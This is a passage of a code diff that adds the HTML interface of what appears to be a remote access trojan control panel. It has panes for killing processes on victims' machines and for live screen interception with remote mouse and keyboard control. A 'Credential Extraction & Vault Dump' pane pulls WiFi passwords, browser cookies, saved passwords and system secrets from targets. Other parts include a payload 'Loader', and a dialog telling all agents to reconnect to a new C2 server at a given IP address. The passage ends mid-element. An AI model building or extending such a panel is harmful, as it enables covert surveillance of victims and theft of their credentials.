+                            <input type="number" id="process-target-pid" placeholder="PID"
+                                style="background: rgba(255, 255, 255, 0.03); border: 1px solid var(--border-subtle); color: var(--text-primary); padding: 5px 8px; border-radius: 8px; font-size: 0.78rem; width: 75px; outline: none; text-align: center;">
+                            <button id="btn-process-suspend" class="cmd-btn"
+                                style="background: rgba(234, 179, 8, 0.12); color: #eab308; border: 1px solid rgba(234, 179, 8, 0.3); border-radius: 8px; padding: 5px 12px; font-size: 0.78rem; font-weight: 600; display: flex; align-items: center; gap: 5px; cursor: pointer; transition: all 0.2s;">
+                                <i class="ph ph-pause"></i>
+                                <span>Suspend</span>
+                            </button>
+                            <button id="btn-process-resume" class="cmd-btn"
+                                style="background: rgba(34, 197, 94, 0.12); color: #4ade80; border: 1px solid rgba(34, 197, 94, 0.3); border-radius: 8px; padding: 5px 12px; font-size: 0.78rem; font-weight: 600; display: flex; align-items: center; gap: 5px; cursor: pointer; transition: all 0.2s;">
+                                <i class="ph ph-play"></i>
+                                <span>Resume</span>
+                            </button>
+                            <button id="btn-process-kill" class="cmd-btn"
+                                style="background: rgba(239, 68, 68, 0.12); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.3); border-radius: 8px; padding: 5px 12px; font-size: 0.78rem; font-weight: 600; display: flex; align-items: center; gap: 5px; cursor: pointer; transition: all 0.2s;">
+                                <i class="ph ph-x-circle"></i>
+                                <span>Kill</span>
+                            </button>
+                            <button id="btn-process-refresh" class="cmd-btn"
+                                style="background: rgba(255, 255, 255, 0.04); color: var(--text-primary); border: 1px solid var(--border-subtle); border-radius: 8px; padding: 5px 12px; font-size: 0.78rem; font-weight: 600; display: flex; align-items: center; gap: 5px; cursor: pointer; transition: all 0.2s;">
+                                <i class="ph ph-arrows-clockwise"></i>
+                                <span>Refresh</span>
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- Process Table Container Box -->
+                    <div class="process-container"
+                        style="flex: 1; display: flex; flex-direction: column; background: #06070a; border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 12px; overflow: hidden; position: relative; box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4); min-height: 0;">
+                        <!-- Cyber Hexagon Watermark SVG -->
+                        <div class="process-watermark"
+                            style="position: absolute; right: 40px; top: 50%; transform: translateY(-50%); pointer-events: none; opacity: 0.12; z-index: 0;">
+                            <svg width="280" height="280" viewBox="0 0 100 100" fill="none" stroke="#a855f7"
+                                stroke-width="1.5">
+                                <polygon points="50,5 93,30 93,80 50,105 7,80 7,30" />
+                                <polygon points="50,15 84,35 84,75 50,95 16,75 16,35" stroke-opacity="0.6" />
+                                <polygon points="50,25 75,40 75,70 50,85 25,70 25,40" stroke-opacity="0.3" />
+                            </svg>
+                        </div>
+
+                        <div style="flex: 1; overflow-y: auto; overflow-x: auto; position: relative; z-index: 1;">
+                            <table class="files-table process-table"
+                                style="width: 100%; border-collapse: collapse; font-family: 'JetBrains Mono', monospace; font-size: 0.82rem;">
+                                <thead>
+                                    <tr
+                                        style="background: #0b0d13; border-bottom: 1px solid rgba(255, 255, 255, 0.07); text-align: left; color: #64748b; font-size: 0.75rem; text-transform: uppercase; letter-spacing: 0.5px; position: sticky; top: 0; z-index: 2;">
+                                        <th style="padding: 10px 16px; cursor: pointer; user-select: none;"
+                                            id="th-proc-pid">PID <i class="ph ph-arrows-down-up"
+                                                style="font-size: 0.7rem; color: #475569;"></i></th>
+                                        <th style="padding: 10px 16px; cursor: pointer; user-select: none;"
+                                            id="th-proc-name">PROCESS NAME <i class="ph ph-arrows-down-up"
+                                                style="font-size: 0.7rem; color: #475569;"></i></th>
+                                        <th style="padding: 10px 16px; cursor: pointer; user-select: none;"
+                                            id="th-proc-cpu">CPU % <i class="ph ph-arrows-down-up"
+                                                style="font-size: 0.7rem; color: #475569;"></i></th>
+                                        <th style="padding: 10px 16px; cursor: pointer; user-select: none;"
+                                            id="th-proc-mem">MEMORY (MB) <i class="ph ph-arrows-down-up"
+                                                style="font-size: 0.7rem; color: #475569;"></i></th>
+                                        <th style="padding: 10px 16px; cursor: pointer; user-select: none;"
+                                            id="th-proc-status">STATUS <i class="ph ph-arrows-down-up"
+                                                style="font-size: 0.7rem; color: #475569;"></i></th>
+                                        <th style="padding: 10px 16px; text-align: right;">ACTIONS</th>
+                                    </tr>
+                                </thead>
+                                <tbody id="process-table-body">
+                                    <tr>
+                                        <td colspan="6" style="padding: 40px; text-align: center; color: #64748b;">
+                                            <i class="ph ph-cpu"
+                                                style="font-size: 2rem; display: block; margin-bottom: 8px; opacity: 0.5;"></i>
+                                            Select an active agent to view remote process list
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 4C. LIVE SCREEN PANE -->
+                <div id="pane-screen" class="whoami_404-pane mrspy-pane whoami-pane">
+                    <div class="section-header"
+                        style="display: flex; align-items: center; justify-content: space-between; gap: 12px; flex-wrap: wrap; width: 100%; margin-bottom: 14px;">
+                        <div class="section-title"
+                            style="white-space: nowrap; flex: 0 0 auto; font-size: 1.1rem; display: flex; align-items: center; gap: 8px;">
+                            <i class="ph-bold ph-desktop" style="color: var(--accent-primary);"></i>
+                            <span>Live Screen Intercept</span>
+                            <span id="screen-fps-live"
+                                style="font-size: 0.78rem; font-weight: 600; color: var(--text-muted); background: rgba(168,85,247,0.1); padding: 2px 8px; border-radius: 6px; font-family: 'JetBrains Mono', monospace;">0
+                                FPS</span>
+                            <span id="screen-quality-badge"
+                                style="display: none; font-size: 0.78rem; font-weight: 600; color: #4ade80; background: rgba(74,222,128,0.15); padding: 2px 8px; border-radius: 6px; font-family: 'JetBrains Mono', monospace;">1080p</span>
+                            <span id="screen-bitrate-badge"
+                                style="display: none; font-size: 0.78rem; font-weight: 600; color: #38bdf8; background: rgba(56,189,248,0.15); padding: 2px 8px; border-radius: 6px; font-family: 'JetBrains Mono', monospace;">0
+                                Mbps</span>
+                        </div>
+                        <div
+                            style="margin-left: auto; display: flex; gap: 8px; align-items: center; flex-wrap: wrap; justify-content: flex-end; white-space: nowrap;">
+                            <!-- Full Remote Control Toggle -->
+                            <button class="f-action-pill secondary" id="btn-remote-control"
+                                title="Toggle interactive mouse & keyboard control"
+                                style="background: var(--bg-card); border: 1.5px solid var(--border-subtle); color: var(--text-primary); padding: 5px 10px; font-size: 0.8rem; white-space: nowrap; flex-shrink: 0; display: inline-flex; align-items: center; gap: 6px; cursor: pointer; transition: all 0.2s ease;">
+                                <i class="ph-bold ph-game-controller" id="remote-control-icon"
+                                    style="font-size: 1rem; color: var(--text-muted);"></i>
+                                <span id="remote-control-label" style="font-weight: 600;">Control: OFF</span>
+                            </button>
+
+                            <!-- System Shortcuts Menu -->
+                            <div class="custom-dropdown" style="position: relative; display: inline-block;">
+                                <button class="f-action-pill secondary" id="btn-screen-shortcuts"
+                                    title="Remote System Shortcuts"
+                                    style="background: var(--bg-card); border: 1px solid var(--border-subtle); color: var(--text-primary); padding: 5px 10px; font-size: 0.8rem; white-space: nowrap; flex-shrink: 0; display: inline-flex; align-items: center; gap: 5px; cursor: pointer;">
+                                    <i class="ph ph-command"></i>
+                                    <span>Shortcuts</span>
+                                    <i class="ph ph-caret-down" style="font-size: 0.7rem;"></i>
+                                </button>
+                                <div id="screen-shortcuts-menu" class="shortcuts-dropdown-menu"
+                                    style="display: none; position: absolute; right: 0; top: calc(100% + 6px); background: #0b0d14; border: 1px solid var(--border-subtle); border-radius: 10px; box-shadow: 0 12px 36px rgba(0,0,0,0.8); z-index: 1000; min-width: 190px; padding: 6px 0; backdrop-filter: blur(12px);">
+                                    <button class="shortcut-item-btn" data-action="win_r"
+                                        style="width: 100%; display: flex; align-items: center; gap: 8px; padding: 8px 14px; background: transparent; border: none; color: var(--text-primary); font-size: 0.82rem; cursor: pointer; text-align: left; transition: background 0.15s;"><i
+                                            class="ph ph-terminal-window" style="color: var(--accent-primary);"></i> Run
+                                        Dialog (Win+R)</button>
+                                    <button class="shortcut-item-btn" data-action="win_d"
+                                        style="width: 100%; display: flex; align-items: center; gap: 8px; padding: 8px 14px; background: transparent; border: none; color: var(--text-primary); font-size: 0.82rem; cursor: pointer; text-align: left; transition: background 0.15s;"><i
+                                            class="ph ph-desktop" style="color: var(--accent-primary);"></i> Show
+                                        Desktop (Win+D)</button>
+                                    <button class="shortcut-item-btn" data-action="alt_tab"
+                                        style="width: 100%; display: flex; align-items: center; gap: 8px; padding: 8px 14px; background: transparent; border: none; color: var(--text-primary); font-size: 0.82rem; cursor: pointer; text-align: left; transition: background 0.15s;"><i
+                                            class="ph ph-arrows-left-right" style="color: var(--accent-primary);"></i>
+                                        Switch App (Alt+Tab)</button>
+                                    <button class="shortcut-item-btn" data-action="taskmgr"
+                                        style="width: 100%; display: flex; align-items: center; gap: 8px; padding: 8px 14px; background: transparent; border: none; color: var(--text-primary); font-size: 0.82rem; cursor: pointer; text-align: left; transition: background 0.15s;"><i
+                                            class="ph ph-activity" style="color: var(--accent-primary);"></i> Task
+                                        Manager</button>
+                                    <div style="height: 1px; background: var(--border-subtle); margin: 4px 0;"></div>
+                                    <button class="shortcut-item-btn" data-action="ctrl_c"
+                                        style="width: 100%; display: flex; align-items: center; gap: 8px; padding: 8px 14px; background: transparent; border: none; color: var(--text-primary); font-size: 0.82rem; cursor: pointer; text-align: left; transition: background 0.15s;"><i
+                                            class="ph ph-copy" style="color: #38bdf8;"></i> Copy (Ctrl+C)</button>
+                                    <button class="shortcut-item-btn" data-action="ctrl_v"
+                                        style="width: 100%; display: flex; align-items: center; gap: 8px; padding: 8px 14px; background: transparent; border: none; color: var(--text-primary); font-size: 0.82rem; cursor: pointer; text-align: left; transition: background 0.15s;"><i
+                                            class="ph ph-clipboard-text" style="color: #38bdf8;"></i> Paste
+                                        (Ctrl+V)</button>
+                                    <button class="shortcut-item-btn" data-action="lock"
+                                        style="width: 100%; display: flex; align-items: center; gap: 8px; padding: 8px 14px; background: transparent; border: none; color: #f87171; font-size: 0.82rem; cursor: pointer; text-align: left; transition: background 0.15s;"><i
+                                            class="ph ph-lock" style="color: #f87171;"></i> Lock Workstation</button>
+                                </div>
+                            </div>
+
+                            <div class="fps-select-pill" style="padding: 3px 6px;">
+                                <i class="ph ph-sliders" style="color: var(--accent-primary); font-size: 0.85rem;"></i>
+                                <span
+                                    style="color: var(--text-secondary); font-size: 0.8rem; font-weight: 500;">Res:</span>
+                                <select id="screen-res" class="fps-select-input"
+                                    style="padding: 2px 4px; font-size: 0.8rem;">
+                                    <option value="1920" selected>1080p FHD</option>
+                                    <option value="0">Native Display</option>
+                                    <option value="2560">2K QHD</option>
+                                    <option value="1280">720p HD</option>
+                                    <option value="854">480p Low</option>
+                                </select>
+                            </div>
+                            <div class="fps-select-pill" style="padding: 3px 6px;">
+                                <i class="ph ph-sparkle" style="color: var(--accent-primary); font-size: 0.85rem;"></i>
+                                <span
+                                    style="color: var(--text-secondary); font-size: 0.8rem; font-weight: 500;">Quality:</span>
+                                <select id="screen-quality" class="fps-select-input"
+                                    style="padding: 2px 4px; font-size: 0.8rem;">
+                                    <option value="90">Ultra (90%)</option>
+                                    <option value="75" selected>Balanced (75%)</option>
+                                    <option value="55">Fast (55%)</option>
+                                </select>
+                            </div>
+                            <div class="fps-select-pill" style="padding: 3px 6px;">
+                                <i class="ph ph-gauge" style="color: var(--accent-primary); font-size: 0.85rem;"></i>
+                                <span
+                                    style="color: var(--text-secondary); font-size: 0.8rem; font-weight: 500;">FPS:</span>
+                                <select id="screen-fps" class="fps-select-input"
+                                    style="padding: 2px 4px; font-size: 0.8rem;">
+                                    <option value="15">15 FPS</option>
+                                    <option value="25">25 FPS</option>
+                                    <option value="30">30 FPS</option>
+                                    <option value="45">45 FPS</option>
+                                    <option value="60" selected>60 FPS</option>
+                                </select>
+                            </div>
+                            <button class="f-action-pill secondary" id="btn-screen-snapshot"
+                                title="Capture high-resolution screenshot"
+                                style="background: var(--bg-card); border: 1px solid var(--border-subtle); color: var(--text-primary); padding: 5px 10px; font-size: 0.8rem; white-space: nowrap; flex-shrink: 0;">
+                                <i class="ph ph-camera"></i>
+                                <span>Screenshot</span>
+                            </button>
+                            <button class="f-action-pill secondary" id="btn-screen-fullscreen" title="Fullscreen view"
+                                style="background: var(--bg-card); border: 1px solid var(--border-subtle); color: var(--text-primary); padding: 5px 10px; font-size: 0.8rem; white-space: nowrap; flex-shrink: 0;">
+                                <i class="ph ph-corners-out"></i>
+                            </button>
+                            <button class="f-action-pill primary" id="btn-screen-start"
+                                style="padding: 5px 12px; font-size: 0.8rem; white-space: nowrap; flex-shrink: 0; min-width: max-content;">
+                                <i class="ph ph-play"></i>
+                                <span>Start Screen</span>
+                            </button>
+                            <button class="f-action-pill" id="btn-screen-stop"
+                                style="display: none; background-color: var(--status-error); color: white; border-color: transparent; padding: 5px 12px; font-size: 0.8rem; white-space: nowrap; flex-shrink: 0; min-width: max-content;">
+                                <i class="ph ph-stop"></i>
+                                <span>Stop Screen</span>
+                            </button>
+                        </div>
+                    </div>
+                    <div id="screen-stream-wrapper" class="stream-container"
+                        style="background: #000; border: 1.5px solid var(--border-subtle); border-radius: 16px; padding: 0; height: calc(100vh - 110px); min-height: 0; width: 100%; display: flex; align-items: center; justify-content: center; position: relative; overflow: hidden; user-select: none;">
+                        <div id="remote-control-hud"
+                            style="display: none; position: absolute; top: 14px; left: 14px; z-index: 15; background: rgba(16, 185, 129, 0.22); border: 1px solid rgba(16, 185, 129, 0.6); backdrop-filter: blur(8px); padding: 4px 12px; border-radius: 8px; font-size: 0.75rem; font-weight: 600; color: #34d399; font-family: 'JetBrains Mono', monospace; pointer-events: none; box-shadow: 0 4px 16px rgba(0,0,0,0.5);">
+                            <span
+                                style="display: inline-block; width: 7px; height: 7px; background: #34d399; border-radius: 50%; margin-right: 6px; animation: pulse 1.5s infinite;"></span>
+                            <span>REMOTE CONTROL ACTIVE (UDP DataChannel)</span>
+                        </div>
+                        <div id="screen-placeholder" class="placeholder-state">
+                            <div class="placeholder-icon">
+                                <i class="ph-thin ph-desktop"></i>
+                            </div>
+                            <h3>No Live Screen Active</h3>
+                            <p>Select an agent and click Start Screen to stream the device display</p>
+                        </div>
+                        <video id="screen-video" autoplay playsinline muted tabindex="0"
+                            style="display: none; width: 100%; height: 100%; object-fit: contain; background: #000; image-rendering: -webkit-optimize-contrast; transform: translateZ(0); outline: none; cursor: default;"></video>
+                        <img id="screen-img"
+                            style="display: none; width: 100%; height: 100%; object-fit: contain; background: #000;" />
+                    </div>
+                </div>
+
+                <!-- 4D. CREDENTIAL DUMP PANE -->
+                <div id="pane-dump" class="whoami_404-pane mrspy-pane whoami-pane">
+                    <div class="section-header">
+                        <div class="section-title">
+                            <i class="ph-bold ph-database" style="color: var(--accent-primary);"></i>
+                            <span>Credential Extraction & Vault Dump</span>
+                        </div>
+                        <div style="display: flex; gap: 10px; flex-wrap: wrap;">
+                            <button class="dev-btn dev-action-btn dump-trigger-btn" id="btn-dump-wifi">
+                                <i class="ph ph-wifi-high"></i> WiFi Passwords
+                            </button>
+                            <button class="dev-btn dev-action-btn dump-trigger-btn" id="btn-dump-cookies">
+                                <i class="ph ph-cookie"></i> Browser Cookies
+                            </button>
+                            <button class="dev-btn dev-action-btn dump-trigger-btn" id="btn-dump-passwords">
+                                <i class="ph ph-key"></i> Saved Passwords
+                            </button>
+                            <button class="dev-btn dev-action-btn dump-trigger-btn" id="btn-dump-system">
+                                <i class="ph ph-shield-check"></i> System Secrets
+                            </button>
+                        </div>
+                    </div>
+
+                    <div
+                        style="background: var(--bg-surface); border: 1.5px solid var(--border-subtle); border-radius: 16px; padding: 24px; box-shadow: 0 10px 30px rgba(0,0,0,0.3);">
+                        <div
+                            style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px;">
+                            <h4 id="dump-status-header" style="margin: 0; color: var(--text-primary); font-size: 16px;">
+                                <i class="ph ph-lock-key" style="color: var(--accent-primary);"></i> Select a dump
+                                action above to extract secrets from target device
+                            </h4>
+                            <span id="dump-counter" style="color: var(--text-muted); font-size: 13px;">Ready</span>
+                        </div>
+
+                        <div class="table-container" style="max-height: 520px; overflow-y: auto;">
+                            <table class="whoami_404-table mrspy-table whoami-table"
+                                style="width: 100%; border-collapse: collapse;">
+                                <thead id="dump-table-head">
+                                    <tr>
+                                        <th
+                                            style="width: 22%; text-align: left; padding: 12px; color: var(--text-muted); border-bottom: 1px solid var(--border-subtle);">
+                                            Source / Type</th>
+                                        <th
+                                            style="width: 28%; text-align: left; padding: 12px; color: var(--text-muted); border-bottom: 1px solid var(--border-subtle);">
+                                            Target / Profile</th>
+                                        <th
+                                            style="width: 28%; text-align: left; padding: 12px; color: var(--text-muted); border-bottom: 1px solid var(--border-subtle);">
+                                            Extracted Secret / Password</th>
+                                        <th
+                                            style="width: 22%; text-align: left; padding: 12px; color: var(--text-muted); border-bottom: 1px solid var(--border-subtle);">
+                                            Protection / Meta</th>
+                                    </tr>
+                                </thead>
+                                <tbody id="dump-table-body">
+                                    <tr>
+                                        <td colspan="4"
+                                            style="text-align: center; padding: 48px; color: var(--text-muted);">
+                                            <i class="ph-thin ph-database"
+                                                style="font-size: 40px; display: block; margin-bottom: 12px; color: var(--accent-primary);"></i>
+                                            Click any credential button above to pull secrets from target host
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 5. PROCESSES / SYSTEM INFO PANE -->
+                <div id="pane-processes" class="whoami_404-pane mrspy-pane whoami-pane">
+                    <div class="section-header">
+                        <div class="section-title">
+                            <i class="ph-bold ph-cpu" style="color: var(--accent-primary);"></i>
+                            <span>System Information & Telemetry</span>
+                        </div>
+                    </div>
+                    <div id="data-content" class="data-grid">
+                        <div class="placeholder-state">
+                            <div class="placeholder-icon">
+                                <i class="ph-thin ph-chart-bar"></i>
+                            </div>
+                            <h3>Agent System Data</h3>
+                            <p>Select a device from Overview to inspect detailed system specifications</p>
+                        </div>
+                    </div>
+                </div>
+
+
+                <!-- 7. OTHER FEATURES PANE -->
+                <div id="pane-other-features" class="whoami_404-pane mrspy-pane whoami-pane">
+                    <div class="section-header">
+                        <div class="section-title">
+                            <i class="ph-bold ph-squares-four" style="color: var(--accent-primary);"></i>
+                            <span>Other Features</span>
+                        </div>
+                    </div>
+                    <div
+                        style="display: flex; gap: 20px; flex-wrap: wrap; padding: 20px; background: var(--bg-surface); border: 1.5px solid var(--border-subtle); border-radius: 16px; align-content: flex-start;">
+
+                        <button id="btn-feature-msg"
+                            style="flex: 1; min-width: 200px; max-width: 250px; padding: 24px; text-align: center; border-radius: 12px; background: var(--bg-deep); border: 1px solid var(--border-subtle); cursor: pointer; color: var(--text-primary); transition: all 0.2s;">
+                            <i class="ph ph-chat-centered-text"
+                                style="font-size: 2.5rem; margin-bottom: 12px; display: block; color: var(--accent-primary);"></i>
+                            <span style="font-size: 1.1rem; font-weight: 500;">Message Box</span>
+                        </button>
+                        <button id="btn-feature-url"
+                            style="flex: 1; min-width: 200px; max-width: 250px; padding: 24px; text-align: center; border-radius: 12px; background: var(--bg-deep); border: 1px solid var(--border-subtle); cursor: pointer; color: var(--text-primary); transition: all 0.2s;">
+                            <i class="ph ph-link"
+                                style="font-size: 2.5rem; margin-bottom: 12px; display: block; color: var(--accent-primary);"></i>
+                            <span style="font-size: 1.1rem; font-weight: 500;">Open URL</span>
+                        </button>
+                        <button id="btn-feature-loader"
+                            style="flex: 1; min-width: 200px; max-width: 250px; padding: 24px; text-align: center; border-radius: 12px; background: var(--bg-deep); border: 1px solid var(--border-subtle); cursor: pointer; color: var(--text-primary); transition: all 0.2s;">
+                            <i class="ph ph-download-simple"
+                                style="font-size: 2.5rem; margin-bottom: 12px; display: block; color: var(--accent-primary);"></i>
+                            <span style="font-size: 1.1rem; font-weight: 500;">Loader</span>
+                        </button>
+                        <button id="btn-feature-upgrader"
+                            style="flex: 1; min-width: 200px; max-width: 250px; padding: 24px; text-align: center; border-radius: 12px; background: var(--bg-deep); border: 1px solid var(--border-subtle); cursor: pointer; color: var(--text-primary); transition: all 0.2s;">
+                            <i class="ph ph-arrows-clockwise"
+                                style="font-size: 2.5rem; margin-bottom: 12px; display: block; color: var(--accent-primary);"></i>
+                            <span style="font-size: 1.1rem; font-weight: 500;">Upgrader</span>
+                        </button>
+                    </div>
+
+                    <div id="other-features-result"
+                        style="margin-top: 20px; background: var(--bg-surface); border: 1.5px solid var(--border-subtle); border-radius: 16px; padding: 20px; min-height: 200px; display: none;">
+                        <h4 id="other-features-result-title" style="margin-bottom: 15px; color: var(--accent-primary);">
+                            Result</h4>
+                        <div id="other-features-result-content" style="max-height: 350px; overflow-y: auto;"></div>
+                    </div>
+                </div>
+
+                <!-- 8. SETTINGS & LOGS PANE -->
+                <div id="pane-settings" class="whoami_404-pane mrspy-pane whoami-pane">
+                    <div class="section-header">
+                        <div class="section-title">
+                            <i class="ph-bold ph-gear" style="color: var(--accent-primary);"></i>
+                            <span>Panel Settings & System Logs</span>
+                        </div>
+                    </div>
+
+                    <!-- Google Authenticator 2FA Single Device Security Card -->
+                    <div
+                        style="width: 100%; margin-bottom: 24px; background: var(--bg-surface); border: 1.5px solid var(--border-subtle); border-radius: 16px; padding: 22px; box-shadow: 0 10px 30px rgba(0,0,0,0.3);">
+                        <div
+                            style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 16px;">
+                            <h4
+                                style="margin: 0; color: var(--text-primary); font-size: 1.1rem; display: flex; align-items: center; gap: 8px;">
+                                <i class="ph-bold ph-shield-check" style="color: #a855f7;"></i> Google Authenticator 2FA
+                                Security (Single Device Bound)
+                            </h4>
+                            <span id="totp-status-badge" class="badge"
+                                style="padding: 6px 12px; border-radius: 20px; font-size: 0.8rem; font-weight: 600; background: rgba(168, 85, 247, 0.15); color: #c084fc; border: 1px solid rgba(168, 85, 247, 0.3);">
+                                Checking 2FA...
+                            </span>
+                        </div>
+
+                        <!-- Single Device Unpaired Setup View -->
+                        <div id="totp-setup-box"
+                            style="display: none; background: var(--bg-deep); border: 1px solid var(--border-subtle); border-radius: 12px; padding: 20px; margin-top: 12px;">
+                            <p style="color: var(--text-secondary); font-size: 0.9rem; margin-bottom: 16px;">
+                                Scan this QR code with your <strong>Google Authenticator</strong> mobile app. Once
+                                paired, entering your first 6-digit code locks 2FA to your single device and permanently
+                                hides this QR code.
+                            </p>
+                            <div style="display: flex; gap: 24px; align-items: center; flex-wrap: wrap;">
+                                <div
+                                    style="background: #fff; padding: 12px; border-radius: 12px; display: flex; align-items: center; justify-content: center; width: 160px; height: 160px;">
+                                    <img id="totp-qr-img" src="" alt="Google Authenticator QR Code"
+                                        style="width: 136px; height: 136px; display: block;">
+                                </div>
+                                <div style="flex: 1; min-width: 250px;">
+                                    <label
+                                        style="display: block; font-size: 0.75rem; color: var(--text-muted); text-transform: uppercase; font-weight: 600; margin-bottom: 4px;">Manual
+                                        Secret Key</label>
+                                    <div style="font-family: monospace; font-size: 1.1rem; color: #a855f7; background: rgba(0,0,0,0.3); padding: 8px 12px; border-radius: 6px; letter-spacing: 2px; margin-bottom: 14px; user-select: all;"
+                                        id="totp-secret-key">
+                                        Loading...
+                                    </div>
+
+                                    <label
+                                        style="display: block; font-size: 0.75rem; color: var(--text-muted); text-transform: uppercase; font-weight: 600; margin-bottom: 4px;">Enter
+                                        6-Digit Authenticator Code to Pair</label>
+                                    <div style="display: flex; gap: 10px; flex-wrap: wrap;">
+                                        <input type="text" id="totp-bind-code" placeholder="" maxlength="6"
+                                            autocomplete="off"
+                                            style="width: 140px; text-align: center; letter-spacing: 3px; font-size: 1.1rem; font-weight: bold; padding: 8px; border-radius: 6px; border: 1px solid var(--border-subtle); background: var(--bg-surface); color: var(--text-primary);">
+                                        <button id="totp-bind-btn" class="f-action-pill primary"
+                                            style="background: var(--accent-primary); border: none; color: #fff; padding: 8px 18px; font-weight: 600;">
+                                            <i class="ph ph-lock-key"></i> Pair & Lock Device
+                                        </button>
+                                    </div>
+                                    <div id="totp-bind-error"
+                                        style="color: #f87171; font-size: 0.8rem; margin-top: 6px; display: none;">
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Single Device Paired / Protected View -->
+                        <div id="totp-paired-box"
+                            style="display: none; background: rgba(74, 222, 128, 0.05); border: 1px solid rgba(74, 222, 128, 0.2); border-radius: 12px; padding: 20px; margin-top: 12px;">
+                            <div
+                                style="display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 16px;">
+                                <div>
+                                    <h5
+                                        style="margin: 0 0 6px 0; color: #4ade80; font-size: 1rem; display: flex; align-items: center; gap: 6px;">
+                                        <i class="ph-bold ph-check-circle"></i> Single Device Paired & Protected
+                                    </h5>
+                                    <p style="margin: 0; color: var(--text-secondary); font-size: 0.88rem;">
+                                        Google Authenticator 2FA is active on your device. The QR code and secret are
+                                        permanently locked and cannot be scanned by any other device. Destructive
+                                        actions like <strong>Kill Agent</strong> and <strong>KILL ALL</strong> require
+                                        live 2FA validation.
+                                    </p>
+                                </div>
+                                <button id="totp-reset-btn" class="f-action-pill secondary"
+                                    style="background: rgba(239, 68, 68, 0.15); color: #f87171; border-color: rgba(239, 68, 68, 0.3);">
+                                    <i class="ph ph-arrows-clockwise"></i> Reset 2FA Pairing
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                    <div style="display: flex; gap: 24px; flex-wrap: wrap;">
+                        <div
+                            style="flex: 1; min-width: 320px; background: var(--bg-surface); border: 1.5px solid var(--border-subtle); border-radius: 16px; padding: 22px;">
+                            <h4 style="margin-bottom: 14px; color: var(--text-primary);"><i class="ph ph-scroll"></i>
+                                Event Logs</h4>
+                            <div id="log-output" class="log-output" style="max-height: 400px; overflow-y: auto;">
+                                <div class="log-empty">
+                                    <i class="ph ph-note-blank"></i>
+                                    <span>No events yet</span>
+                                </div>
+                            </div>
+                        </div>
+                        <div
+                            style="flex: 1; min-width: 320px; background: var(--bg-surface); border: 1.5px solid var(--border-subtle); border-radius: 16px; padding: 22px;">
+                            <h4 style="margin-bottom: 14px; color: var(--text-primary);"><i
+                                    class="ph ph-chart-pie-slice"></i> Device Telemetry Status</h4>
+                            <div id="agent-stats" class="stats-grid">
+                                <div class="placeholder-state small">
+                                    <i class="ph-thin ph-chart-pie-slice"></i>
+                                    <p>Select a device</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+        </main>
+    </div>
+
+    <!-- Hidden compatibility elements required by legacy selectors or modals -->
+    <div style="display:none;">
+        <div id="sidebar-left"></div>
+        <div id="workspace"></div>
+        <div id="sidebar-right"></div>
+        <div id="command-bar"></div>
+        <div id="workspace-tabs"></div>
+        <div id="right-tabs"></div>
+    </div>
+
+    <!-- ═══════════════════ LOCK SCREEN OVERLAY ═══════════════════ -->
+    <div id="lock-screen" class="lock-overlay" style="display:none;">
+        <div class="lock-card">
+            <div class="lock-icon">
+                <i class="ph-bold ph-lock-key"></i>
+            </div>
+            <h2>Panel Locked</h2>
+            <p>Enter passphrase to resume operations</p>
+            <div class="lock-input-wrap">
+                <input type="password" id="lock-password" placeholder="Passphrase" autocomplete="off">
+            </div>
+            <button id="unlock-btn" class="auth-submit">
+                <i class="ph ph-lock-key-open"></i>
+                <span>Unlock</span>
+            </button>
+        </div>
+    </div>
+
+    <!-- ═══════════════════ CHANGE URL OVERLAY ═══════════════════ -->
+    <div id="change-url-screen" class="lock-overlay" style="display:none;">
+        <div class="lock-card"
+            style="box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid var(--border-subtle); background: var(--bg-surface); backdrop-filter: blur(8px);">
+            <div class="lock-icon"
+                style="background: rgba(139, 92, 246, 0.1); color: var(--accent-primary); border: 1px solid rgba(139, 92, 246, 0.2);">
+                <i class="ph-bold ph-link"></i>
+            </div>
+            <h2 style="color: var(--text-primary); margin-bottom: 8px; font-weight: 600;">Change Server URL</h2>
+            <p style="color: var(--text-secondary); font-size: 0.95rem; margin-bottom: 15px; line-height: 1.4;">
+                This command instructs all active agents to permanently reconnect to a new C2 server address. Use this
+                if you are migrating the control panel to a new IP or domain.
+            </p>
+            <div style="margin-bottom: 24px;">
+                <label
+                    style="display:block; text-align:left; margin-bottom: 8px; font-size: 0.85rem; font-weight: 500; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 0.5px;">New
+                    Server URL</label>
+                <div class="lock-input-wrap">
+                    <input type="text" id="global-new-url" placeholder="http://150.136.246.12:33875" autocomplete="off"
+                        style="background: var(--bg-deep); border: 1px solid var(--border-subtle); color: var(--text-primary); border-radius: 8px; padding: 12px 16px;">
+                </div>
+            </div>
+            <div style="display: flex; gap: 12px; margin-top: 15px;">
+                <button id="change-url-submit-btn" class="auth-submit"
+                    style="flex: 1; border-radius: 8px; background: var(--accent-primary); border: none; box-shadow: 0 0 15px rgba(139, 92, 246, 0.4); color: #fff;">
+                    <i class="ph ph-check"></i>
+                    <span style="font-weight: 600;">Apply</span>
+                </button>
+                <button id="change-url-cancel-btn" class="auth-submit custom-cancel-btn"
+                    style="flex: 1; border-radius: 8px; background: var(--bg-elevated); color: var(--text-secondary); border: 1px solid var(--border-subtle);">
+                    <i class="ph ph-x"></i>
+                    <span style="font-weight: 600;">Cancel</span>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- ═══════════════════ LOADER OVERLAY ═══════════════════ -->
+    <div id="loader-screen" class="lock-overlay" style="display:none;">
+        <div class="lock-card"
+            style="box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid var(--border-subtle); background: var(--bg-surface); backdrop-filter: blur(8px);">
+            <div class="lock-icon"
